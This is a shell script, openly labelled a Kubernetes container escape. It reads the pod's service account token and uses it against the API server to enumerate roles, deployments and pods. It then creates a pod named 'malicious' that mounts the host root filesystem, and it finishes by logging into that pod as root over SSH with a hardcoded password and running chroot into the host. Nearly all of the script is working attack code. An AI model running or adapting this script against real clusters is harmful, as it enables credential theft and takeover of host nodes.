#!/bin/sh
set -e 

echo "[start] kubernetes escape started"

find /run/secrets -name "*kubernetes*" 2>/dev/null

ls -al /run/secrets/kubernetes.io/serviceaccount/

cat /run/secrets/kubernetes.io/serviceaccount/namespace
cat /run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/ca.crt

export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}

export SERVICEACCOUNT=/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt

curl --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -v https://$APISERVER//apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles

curl --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -v https://$APISERVER/apis/apps/v1/namespaces/$NAMESPACE/deployments/

curl --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -v https://$APISERVER/api/v1/namespaces/$NAMESPACE/pods/

curl --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X POST -H 'Content-Type: application/yaml' --data '
apiVersion: v1
kind: Pod
metadata:
  name: malicious
spec:
  containers:
  - name: malicious
    image: # malicious image with ssh server, 
    imagePullPolicy: Always
    ports:
    - containerPort: 80
    securityContext:
      capabilities:
        add:
        - SYS_CHROOT
    volumeMounts:
    - name: host-path
      mountPath: /host
  volumes:
  - name: host-path
    hostPath:
      path: /
' https://$APISERVER/api/v1/namespaces/$NAMESPACE/pods/

echo "[*] Waiting for malicious pod to be Running..."
MALICIOUS_IP=""
for i in $(seq 1 20); do
    PODS_JSON=$(curl -s --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" https://$APISERVER/api/v1/namespaces/$NAMESPACE/pods/)

    PHASE=$(echo "$PODS_JSON" | grep -A 300 '"name": "malicious"' | grep '"phase"' | head -1 | sed 's/.*"phase": "\([^"]*\)".*/\1/')
    POD_IP=$(echo "$PODS_JSON" | grep -A 300 '"name": "malicious"' | grep '"podIP"' | grep -v 'podIPs' | head -1 | sed 's/.*"podIP": "\([^"]*\)".*/\1/')

    echo "[*] Attempt $i: phase=$PHASE, ip=$POD_IP"

    if [ "$PHASE" = "Running" ] && [ -n "$POD_IP" ]; then
        MALICIOUS_IP=$POD_IP
        break
    fi

    sleep 3
done

if [ -z "$MALICIOUS_IP" ]; then
    echo "[ERROR] Could not get malicious pod IP after waiting"
    exit 1
fi

echo "[*] Malicious pod IP: $MALICIOUS_IP"

apt update
apt install openssh-server expect -y

expect -c "
spawn ssh -p 22 root@$MALICIOUS_IP
  expect {
      -re {yes/no} { send \"yes\r\"; exp_continue }
      -re {password:} { send \"1234\r\" }
  }
  expect -re {\\\$|#}

  send \"hostname\r\"
  expect -re {\\\$|#}

  send \"ls /\r\"
  expect -re {\\\$|#}

  send \"chroot /host\r\"
  expect -re {\\\$|#}

  send \"ls /\r\"
  expect -re {\\\$|#}

  send \"exit\r\"
  expect eof
"

echo "[done] kubernetes escape completed"